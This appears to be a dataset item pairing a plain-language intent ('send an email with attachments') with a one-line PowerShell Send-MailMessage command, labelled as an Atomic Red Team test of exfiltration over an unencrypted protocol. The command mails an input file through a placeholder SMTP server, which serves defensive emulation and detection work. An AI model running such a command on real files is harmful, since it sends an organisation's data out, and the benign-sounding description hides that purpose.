# Natural language intent:
# Send an email with a specific subject, sender, receiver, attachments, and SMTP server.

Send-MailMessage -From ${sender} -To ${receiver} -Subject "T1048.003 Atomic Test" -Attachments ${input_file} -SmtpServer ${smtp_server}
